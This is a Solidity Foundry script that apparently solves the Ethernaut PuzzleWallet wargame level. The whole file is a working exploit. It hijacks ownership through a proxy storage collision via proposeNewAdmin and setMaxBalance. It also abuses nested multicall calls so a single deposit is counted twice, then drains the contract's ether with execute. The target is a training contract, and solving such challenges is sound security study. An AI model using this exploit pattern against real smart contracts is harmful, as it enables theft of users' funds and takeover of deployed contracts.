// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../../lib/forge-std/src/Script.sol";
import {IPuzzleWallet} from "../../test/Ethernaut/PuzzleWallet.t.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();

        address playerAddress = 0xB3D6fac08D421164A414970D5225845b3A91F33F;
        address instanceAddress = 0x8385d326978a6558a97744352016d324F93d1196;
        uint256 initValue = 0.001 ether;

        IPuzzleWallet iPuzzleWallet = IPuzzleWallet(instanceAddress);
        iPuzzleWallet.proposeNewAdmin(playerAddress);
        iPuzzleWallet.addToWhitelist(playerAddress);
        bytes[] memory depositData = new bytes[](1);
        depositData[0] = abi.encodeWithSelector(iPuzzleWallet.deposit.selector);
        bytes[] memory data = new bytes[](2);
        data[0] = depositData[0];
        data[1] = abi.encodeWithSelector(
            iPuzzleWallet.multicall.selector,
            depositData
        );

        iPuzzleWallet.multicall{value: initValue}(data);
        iPuzzleWallet.execute(playerAddress, 2 * initValue, "");
        iPuzzleWallet.setMaxBalance(uint256(uint160(address(playerAddress))));
        vm.stopBroadcast();
    }
}
